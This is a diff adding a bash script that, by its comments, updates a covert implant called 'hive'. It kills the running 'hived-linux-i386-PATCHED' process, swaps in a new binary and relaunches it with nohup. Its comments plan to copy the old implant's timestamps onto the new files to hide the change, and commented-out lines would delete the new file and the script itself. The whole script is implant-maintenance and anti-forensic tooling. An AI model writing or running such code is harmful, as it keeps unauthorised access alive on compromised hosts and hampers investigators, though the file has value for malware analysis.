@@ -1,0 +1,26 @@
+#!/bin/bash
+fileToDelete=$0
+
+#Most logic required to replace and restart hive...
+
+#  Note that we still need to implement the touch
+#      Would be best to used the oldImplants time to touch newhive and
+#      then use newhive's time to touch the newImplant file just before 
+#      it is ran. 
+
+#killall hived-linux-i386-PATCHED 2>/dev/null
+kill -9 `ps -ef | grep [h]ived-linux-i386-PATCHED | grep -v grep | awk '{print $2}' ` 2>/dev/null
+sleep 5
+rm -f ./hived-linux-i386-PATCHED 2>/dev/null
+sleep 5
+cp -f ./newhive ./hived-linux-i386-PATCHED 2>/dev/null
+sleep 5
+#./hived-linux-i386-PATCHED &>/dev/null
+/usr/bin/nohup /home/miker/runningHive/hived-linux-i386-PATCHED & 
+sleep 5
+
+#Remove newImplant file if it exists
+#rm -f /home/miker/runningHive/newhive 2>/dev/null 
+
+#rm -f $fileToDelete 2>/dev/null
+
